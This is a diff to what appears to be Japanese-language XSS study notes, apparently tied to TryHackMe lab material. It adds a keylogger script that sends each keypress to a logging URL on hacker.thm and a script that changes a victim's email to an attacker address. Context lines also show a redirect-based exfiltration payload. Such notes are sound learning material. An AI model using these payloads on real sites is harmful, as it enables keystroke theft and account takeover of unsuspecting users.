@@ -56,6 +56,22 @@ document.location = "http://"+ email +".1f7d4a50dfb910819a8fba9df66e73ad.log.try
 <iframe src="javascript:alert(`xss`)">
 ```
 
+### キーロガー
+
+```js
+<script>
+document.onkeypress = function(e) {
+fetch('https://hacker.thm/log?key=' + btoa(e.key));
+}
+</script>
+```
+
+### ビジネスロジックを攻撃
+
+```js
+<script>user.changeEmail('attacker@hacker.thm');</script>
+```
+
 ## 参照
 
 ### ペイロードリスト
